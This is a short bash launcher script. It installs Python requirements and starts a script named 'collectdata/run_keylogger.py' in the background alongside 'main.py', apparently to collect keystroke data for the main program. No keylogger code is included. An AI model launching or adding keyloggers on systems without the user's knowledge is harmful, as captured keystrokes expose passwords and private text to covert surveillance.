#!/bin/bash
pip install -r requirements.txt;
python collectdata/run_keylogger.py &
python main.py &
